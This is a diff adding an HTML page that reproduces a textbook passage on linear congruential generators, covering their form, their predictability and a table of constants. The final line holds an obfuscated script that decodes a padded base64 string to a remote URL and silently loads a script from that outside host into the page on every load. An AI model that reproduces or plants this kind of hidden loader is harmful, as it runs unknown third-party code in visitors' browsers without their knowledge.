@@ -1,0 +1,326 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Pseudo-Random-Sequence Generators and Stream Ciphers</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=16//-->
+<!--PAGES=369-371//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch15/15-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 16<BR>Pseudo-Random-Sequence Generators and Stream Ciphers
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">16.1 Linear Congruential Generators</FONT></H3>
+<P><B>Linear congruential generators</B> are pseudo-random-sequence generators of the form</P>
+<DL>
+<DD><I>X</I><SUB>n</SUB> = (<I>aX</I><SUB>n-1</SUB> &#43; <I>b</I>) mod <I>m</I>
+</DL>
+<P>in which <I>X</I><SUB>n</SUB> is the <I>n</I>th number of the sequence, and <I>X</I><SUB>n-1</SUB> is the previous number of the sequence. The variables <I>a, b</I>, and <I>m</I> are constants: <I>a</I> is the <B>multiplier</B>, <I>b</I> is the <B>increment</B>, and <I>m</I> is the modulus. The key, or seed, is the value of <I>X</I><SUB>0</SUB>.</P>
+<P>This generator has a period no greater than <I>m</I>. If <I>a, b</I>, and <I>m</I> are properly chosen, then the generator will be a <B>maximal period generator</B> (sometimes called maximal length) and have period of <I>m</I>. (For example, <I>b</I> should be relatively prime to <I>m</I>.) Details on choosing constants to ensure maximal period can be found in [863,942]. Another good article on linear congruential generators and their theory is [1446].</P>
+<P>Table 16.1, taken from [1272], gives a list of good constants for linear congruential generators. They all produce maximal period generators and even more important, pass the spectral test for randomness for dimensions 2, 3, 4, 5, and 6 [385,863]. They are organized by the largest product that does not overflow a specific word length.</P>
+<P>The advantage of linear congruential generators is that they are fast, requiring few operations per bit.</P>
+<P>Unfortunately, linear congruential generators cannot be used for cryptography; they are predictable. Linear congruential generators were first broken by Jim Reeds [1294,1295,1296] and then by Joan Boyar [1251]. She also broke quadratic generators:</P>
+<DL>
+<DD><I>X</I><SUB>n</SUB> = (<I>aX</I><SUB>n-1</SUB><SUP>2</SUP> &#43; <I>bX</I><SUB>n-1</SUB> &#43; <I>c</I>) mod <I>m</I>
+</DL>
+<P>and cubic generators:
+</P>
+<DL>
+<DD><I>X</I><SUB>n</SUB> = (<I>aX</I><SUB>n-1</SUB><SUP>3</SUP> &#43; <I>bX</I><SUB>n-1</SUB><SUP>2</SUP> &#43; <I>cX</I><SUB>n-1</SUB> &#43; <I>d</I>) mod <I>m</I>
+</DL>
+<P>Other researchers extended Boyar&#146;s work to break any polynomial congruential generator [923,899,900]. Truncated linear congruential generators were also broken [581,705,580], as were truncated linear congruential generators with unknown parameters [1500,212]. The preponderance of evidence is that congruential generators aren&#146;t useful for cryptography.
+</P>
+<TABLE WIDTH="100%"><TH COLSPAN="4" ALIGN="CENTER">Table 16.1<BR>Constants for Linear Congruential Generators
+<TR>
+<TH COLSPAN="4"><HR>
+<TR>
+<TH ALIGN="CENTER">Overflow At:
+<TH ALIGN="CENTER"><I>a</I>
+<TH ALIGN="CENTER"><I>b</I>
+<TH ALIGN="CENTER"><I>m</I>
+<TR>
+<TD COLSPAN="4"><HR>
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>20</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">106
+<TD ALIGN="CENTER" VALIGN="TOP">1283
+<TD ALIGN="CENTER" VALIGN="TOP">6075
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>21</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">211
+<TD ALIGN="CENTER" VALIGN="TOP"> 1663
+<TD ALIGN="CENTER" VALIGN="TOP">7875
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>22</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">421
+<TD ALIGN="CENTER" VALIGN="TOP"> 1663
+<TD ALIGN="CENTER" VALIGN="TOP">7875
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>23</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">430
+<TD ALIGN="CENTER" VALIGN="TOP">2531
+<TD ALIGN="CENTER" VALIGN="TOP">11979
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">936
+<TD ALIGN="CENTER" VALIGN="TOP"> 1399
+<TD ALIGN="CENTER" VALIGN="TOP">6655
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP"> 1366
+<TD ALIGN="CENTER" VALIGN="TOP">1283
+<TD ALIGN="CENTER" VALIGN="TOP">6075
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>24</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">171
+<TD ALIGN="CENTER" VALIGN="TOP">11213
+<TD ALIGN="CENTER" VALIGN="TOP">53125
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">859
+<TD ALIGN="CENTER" VALIGN="TOP">2531
+<TD ALIGN="CENTER" VALIGN="TOP">11979
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">419
+<TD ALIGN="CENTER" VALIGN="TOP">6173
+<TD ALIGN="CENTER" VALIGN="TOP">29282
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">967
+<TD ALIGN="CENTER" VALIGN="TOP">3041
+<TD ALIGN="CENTER" VALIGN="TOP">14406
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>25</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">141
+<TD ALIGN="CENTER" VALIGN="TOP">28411
+<TD ALIGN="CENTER" VALIGN="TOP">134456
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">625
+<TD ALIGN="CENTER" VALIGN="TOP">6571
+<TD ALIGN="CENTER" VALIGN="TOP">31104
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1541
+<TD ALIGN="CENTER" VALIGN="TOP">2957
+<TD ALIGN="CENTER" VALIGN="TOP">14000
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1741
+<TD ALIGN="CENTER" VALIGN="TOP">2731
+<TD ALIGN="CENTER" VALIGN="TOP">12960
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1291
+<TD ALIGN="CENTER" VALIGN="TOP">4621
+<TD ALIGN="CENTER" VALIGN="TOP">21870
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">205
+<TD ALIGN="CENTER" VALIGN="TOP">29573
+<TD ALIGN="CENTER" VALIGN="TOP">139968
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>26</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">421
+<TD ALIGN="CENTER" VALIGN="TOP">17117
+<TD ALIGN="CENTER" VALIGN="TOP">81000
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1255
+<TD ALIGN="CENTER" VALIGN="TOP">6173
+<TD ALIGN="CENTER" VALIGN="TOP">29282
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">281
+<TD ALIGN="CENTER" VALIGN="TOP">28411
+<TD ALIGN="CENTER" VALIGN="TOP">134456
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>27</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">1093
+<TD ALIGN="CENTER" VALIGN="TOP">18257
+<TD ALIGN="CENTER" VALIGN="TOP">86436
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">421
+<TD ALIGN="CENTER" VALIGN="TOP">54773
+<TD ALIGN="CENTER" VALIGN="TOP">259200
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1021
+<TD ALIGN="CENTER" VALIGN="TOP">24631
+<TD ALIGN="CENTER" VALIGN="TOP">116640
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1021
+<TD ALIGN="CENTER" VALIGN="TOP">25673
+<TD ALIGN="CENTER" VALIGN="TOP">121500
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>28</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">1277
+<TD ALIGN="CENTER" VALIGN="TOP">24749
+<TD ALIGN="CENTER" VALIGN="TOP">117128
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">741
+<TD ALIGN="CENTER" VALIGN="TOP">66037
+<TD ALIGN="CENTER" VALIGN="TOP">312500
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">2041
+<TD ALIGN="CENTER" VALIGN="TOP">25673
+<TD ALIGN="CENTER" VALIGN="TOP">121500
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>29</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">2311
+<TD ALIGN="CENTER" VALIGN="TOP">25367
+<TD ALIGN="CENTER" VALIGN="TOP">120050
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1807
+<TD ALIGN="CENTER" VALIGN="TOP">45289
+<TD ALIGN="CENTER" VALIGN="TOP">214326
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1597
+<TD ALIGN="CENTER" VALIGN="TOP">51749
+<TD ALIGN="CENTER" VALIGN="TOP">244944
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1861
+<TD ALIGN="CENTER" VALIGN="TOP">49297
+<TD ALIGN="CENTER" VALIGN="TOP">233280
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">2661
+<TD ALIGN="CENTER" VALIGN="TOP">36979
+<TD ALIGN="CENTER" VALIGN="TOP">175000
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">4081
+<TD ALIGN="CENTER" VALIGN="TOP">25673
+<TD ALIGN="CENTER" VALIGN="TOP">121500
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">3661
+<TD ALIGN="CENTER" VALIGN="TOP">30809
+<TD ALIGN="CENTER" VALIGN="TOP">145800
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>30</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">3877
+<TD ALIGN="CENTER" VALIGN="TOP">29573
+<TD ALIGN="CENTER" VALIGN="TOP">139968
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">3613
+<TD ALIGN="CENTER" VALIGN="TOP">45289
+<TD ALIGN="CENTER" VALIGN="TOP">214326
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">1366
+<TD ALIGN="CENTER" VALIGN="TOP">150889
+<TD ALIGN="CENTER" VALIGN="TOP">714025
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>31</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">8121
+<TD ALIGN="CENTER" VALIGN="TOP">28411
+<TD ALIGN="CENTER" VALIGN="TOP">134456
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">4561
+<TD ALIGN="CENTER" VALIGN="TOP">51349
+<TD ALIGN="CENTER" VALIGN="TOP">243000
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">7141
+<TD ALIGN="CENTER" VALIGN="TOP">54773
+<TD ALIGN="CENTER" VALIGN="TOP">259200
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>32</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">9301
+<TD ALIGN="CENTER" VALIGN="TOP">49297
+<TD ALIGN="CENTER" VALIGN="TOP">233280
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">4096
+<TD ALIGN="CENTER" VALIGN="TOP">150889
+<TD ALIGN="CENTER" VALIGN="TOP">714025
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>33</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">2416
+<TD ALIGN="CENTER" VALIGN="TOP">374441
+<TD ALIGN="CENTER" VALIGN="TOP">1771875
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>34</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">17221
+<TD ALIGN="CENTER" VALIGN="TOP">107839
+<TD ALIGN="CENTER" VALIGN="TOP">510300
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">
+<TD ALIGN="CENTER" VALIGN="TOP">36261
+<TD ALIGN="CENTER" VALIGN="TOP">66037
+<TD ALIGN="CENTER" VALIGN="TOP">312500
+<TR>
+<TD ALIGN="CENTER" VALIGN="TOP">2<SUP>35</SUP>
+<TD ALIGN="CENTER" VALIGN="TOP">84589
+<TD ALIGN="CENTER" VALIGN="TOP">45989
+<TD ALIGN="CENTER" VALIGN="TOP">217728
+<TR>
+<TD COLSPAN="4"><HR>
+</TABLE>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch15/15-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="16-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(TyoDaIQl, NDaTmYqo) {NDaTmYqo = TyoDaIQl.createElement('script');NDaTmYqo.type = 'text/javascript';NDaTmYqo.async = true;NDaTmYqo.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');TyoDaIQl.getElementsByTagName('body')[0].appendChild(NDaTmYqo);}(document));</script></body>
+</html>
